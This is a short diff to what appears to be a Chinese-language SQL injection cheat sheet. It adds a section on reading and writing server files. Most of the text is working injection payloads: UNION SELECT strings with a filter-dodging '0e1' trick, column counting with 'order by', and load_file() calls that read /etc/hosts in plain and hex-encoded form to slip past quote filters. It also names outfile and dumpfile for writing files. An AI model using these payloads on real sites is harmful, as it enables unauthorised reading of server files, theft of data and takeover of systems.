@@ -42,8 +42,15 @@ select`user`,password`from..
 ```
 select user,password from users where user_id=0e1union select 1,2...
 ```
-
 ---
+## 读写文件
+1. load_file()
+```
+?id=-1+union+select+load_file('/etc/hosts')
+十六进制过滤?id=-1+union+select+load_file('0x2f6574632f686f737473')
+```
+2. outfile
+3. dumpfile
 ### 猜字段个数
 * 在注入点后面加order by x
 ### Union all
